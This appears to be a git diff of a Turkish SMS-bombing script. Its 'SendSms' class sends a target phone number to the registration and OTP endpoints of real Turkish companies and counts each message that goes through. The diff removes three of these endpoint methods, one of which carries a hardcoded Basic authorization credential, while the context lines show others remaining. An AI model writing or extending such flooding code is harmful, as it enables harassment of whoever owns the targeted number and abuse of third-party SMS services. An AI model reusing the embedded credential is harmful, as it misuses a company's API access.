@@ -224,22 +224,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
-            
-            
-    #sakasu.com.tr
-    def Sakasu(self):
-        try:
-            data = {"phone": self.phone}
-            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
-            if su.json()["status"] == "ok":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
-            
-    
+                    
     #rentiva.com
     def Rentiva(self): 
         try:
@@ -432,21 +417,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr")
-            
-    
-    #totalistasyonlari.com.tr
-    def Total(self):
-        try:
-            r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}&api_key=GetDocuments%0A", verify=False)
-            if (r.json()["success"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
-            
-            
+                
     #opet.com.tr
     def Opet(self):
         try:
@@ -460,23 +431,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")
-           
-    #tazi.tech
-    def Tazi(self):
-        try:
-            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
-            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
-            r = requests.post(url, headers=headers, json=json)
-            if (r.json()["kod"]) == "0000":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
-            
-    
+ 
     #isbike.istanbul
     def Isbike(self):
         try:
